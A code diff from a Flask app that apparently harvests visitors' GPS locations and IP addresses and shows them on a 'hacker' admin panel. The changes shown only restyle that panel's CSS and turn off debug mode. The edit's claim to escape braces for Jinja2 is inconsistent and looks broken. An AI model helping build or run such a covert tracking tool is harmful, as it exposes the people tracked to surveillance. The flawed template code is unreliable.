@@ -111,7 +111,7 @@ HTML_CAPTURA = f"""
 </html>
 """
 
-# Painel Hacker com fonte de blocos no fundo (Posicionada na região solicitada)
+# Painel Hacker com fonte de blocos no fundo (Com chaves CSS escapadas corretamente para o Jinja2)
 HTML_PAINEL = """
 <!DOCTYPE html>
 <html lang="pt-BR">
@@ -123,16 +123,8 @@ HTML_PAINEL = """
     <link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet">
     
     <style>
-        body { 
-            font-family: 'Courier New', Courier, monospace;
-            margin: 0; 
-            padding: 12px; 
-            background: #050505; 
-            color: #00FF66; 
-            position: relative;
-            min-height: 100vh;
-        }
-        /* Marca d'água "OLHO DE DEUS" posicionada exatamente na área indicada */
+        body {padding: 12px; background: #050505; color: #00FF66; position: relative; min-height: 100vh; margin: 0; font-family: 'Courier New', Courier, monospace;}
+        /* Marca d'água "OLHO DE DEUS" posicionada exatamente na área indicada com chaves escapadas */
         .watermark-olho {{
             position: absolute;
             bottom: 10vh;
@@ -146,98 +138,23 @@ HTML_PAINEL = """
             pointer-events: none;
             text-align: center;
             letter-spacing: 4px;
-        }
-        /* Garante que o conteúdo fique acima da marca d'água */
-        .content-wrapper {{
-            position: relative;
-            z-index: 1;
         }}
-        h2 {
-            color: #00FF66;
-            font-size: 15px;
-            border-bottom: 1px dashed #00FF66;
-            padding-bottom: 4px;
-            margin-top: 25px;
-            text-transform: uppercase;
-        }
-        .status-box {
-            background: #0a0f0a;
-            border: 1px solid #00FF66;
-            padding: 10px;
-            border-radius: 4px;
-            font-size: 13px;
-            margin-bottom: 15px;
-            box-shadow: 0 0 10px rgba(0, 255, 102, 0.1);
-        }
-        .table-container {
-            width: 100%;
-            overflow-x: auto;
-            margin-bottom: 20px;
-            border: 1px solid #1a331a;
-        }
-        table { 
-            width: 100%; 
-            border-collapse: collapse; 
-            background: #080c08; 
-            font-size: 13px;
-        }
-        th, td { 
-            border: 1px solid #1a331a; 
-            padding: 10px 8px; 
-            text-align: left; 
-        }
-        th { 
-            background: #0f1f0f; 
-            color: #00FF66; 
-            font-size: 13px;
-            letter-spacing: 1px;
-        }
-        /* Lista Zebrada Hacker */
-        tr:nth-child(even) { background: #060a06; }
-        tr:nth-child(odd) { background: #0c140c; }
-        
-        a { color: #3399FF; text-decoration: none; font-weight: bold; }
-        a:hover { text-decoration: underline; }
-        
-        .badge { 
-            background: #051a05; 
-            color: #00FF66; 
-            padding: 3px 6px; 
-            border-radius: 3px; 
-            font-size: 11px; 
-            display: inline-block; 
-            margin: 2px 0;
-            border: 1px solid #00FF66;
-        }
-        .id-tag {
-            background: #00FF66;
-            color: #000;
-            font-weight: bold;
-            padding: 2px 6px;
-            border-radius: 3px;
-            font-size: 12px;
-            text-align: center;
-        }
-        details summary {
-            cursor: pointer;
-            color: #3399FF;
-            font-weight: bold;
-        }
-        .empty-msg {
-            color: #FF5555;
-            text-align: center;
-            padding: 15px;
-            font-size: 13px;
-        }
-        .terminal-text {
-            font-size: 12px;
-            color: #88ff88;
-            line-height: 1.4;
-            background: #0a0f0a;
-            padding: 8px;
-            border-left: 3px solid #00FF66;
-            margin-bottom: 15px;
-        }
+        .content-wrapper {position: relative; z-index: 1;}
+        h2 {color: #00FF66; font-size: 15px; border-bottom: 1px dashed #00FF66; padding-bottom: 4px; margin-top: 25px; text-transform: uppercase;}
+        .status-box {background: #0a0f0a; border: 1px solid #00FF66; padding: 10px; border-radius: 4px; font-size: 13px; margin-bottom: 15px; box-shadow: 0 0 10px rgba(0, 255, 102, 0.1);}
+        .table-container {width: 100%; overflow-x: auto; margin-bottom: 20px; border: 1px solid #1a331a;}
+        table {width: 100%; border-collapse: collapse; background: #080c08; font-size: 13px;}
+        th, td {border: 1px solid #1a331a; padding: 10px 8px; text-align: left;}
+        th {background: #0f1f0f; color: #00FF66; font-size: 13px; letter-spacing: 1px;}
+        tr:nth-child(even) {background: #060a06;}
+        tr:nth-child(odd) {background: #0c140c;}
+        a {color: #3399FF; text-decoration: none; font-weight: bold;}
+        a:hover {text-decoration: underline;}
+        .badge {background: #051a05; color: #00FF66; padding: 3px 6px; border-radius: 3px; font-size: 11px; display: inline-block; margin: 2px 0; border: 1px solid #00FF66;}
+        .id-tag {background: #00FF66; color: #000; font-weight: bold; padding: 2px 6px; border-radius: 3px; font-size: 12px; text-align: center;}
+        details summary {cursor: pointer; color: #3399FF; font-weight: bold;}
+        .empty-msg {color: #FF5555; text-align: center; padding: 15px; font-size: 13px;}
+        .terminal-text {font-size: 12px; color: #88ff88; line-height: 1.4; background: #0a0f0a; padding: 8px; border-left: 3px solid #00FF66; margin-bottom: 15px;}
     </style>
 </head>
 <body>
@@ -454,4 +371,4 @@ def admin():
     return render_template_string(HTML_PAINEL, gps=registros_gps, ips=registros_ip)
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000, debug=True)
+    app.run(host='0.0.0.0', port=5000)
